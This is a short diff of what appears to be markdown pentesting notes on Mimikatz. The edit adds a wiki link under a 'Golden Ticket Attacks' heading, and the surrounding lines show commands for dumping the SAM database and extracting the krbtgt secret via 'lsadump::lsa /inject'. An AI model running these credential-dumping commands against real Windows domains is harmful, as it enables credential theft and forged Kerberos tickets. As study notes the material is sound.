@@ -17,7 +17,7 @@ lsadump::sam # Dump SAM database
 ```
 
 ### Golden Ticket Attacks
-Used in [[Attacking-Kerberos]]
+Used in [[Attacking-Kerberos]] see the detailed mechanics of Kerberos  [[Active-Directory-Kerberos-Defined]]
 ```c
 privilege::debug
 lsadump::lsa /inject /name:krbtgt
